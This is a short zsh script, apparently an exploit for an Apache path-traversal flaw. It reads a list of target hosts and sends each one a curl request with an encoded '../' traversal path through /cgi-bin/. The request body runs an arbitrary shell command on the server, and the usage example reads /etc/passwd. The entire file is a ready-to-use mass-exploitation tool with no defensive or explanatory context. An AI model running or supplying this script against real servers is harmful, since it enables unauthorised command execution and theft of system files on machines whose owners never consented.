#!/bin/zsh

# Check if both parameters are provided
if [[ $# -lt 2 ]]; then
    echo "Usage: $0 [TAGET-LIST.TXT] [PATH] [COMMAND]"
    echo "Example: $0 targets.txt /etc/passwd 'cat /etc/passwd'"
    exit 1
fi

# Iterate through each host in the target list
while IFS= read -r host || [[ -n "$host" ]]; do
    echo "Target: $host"
    # Perform the CURL request with proper URL encoding
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"
done < "$1"

exit 0
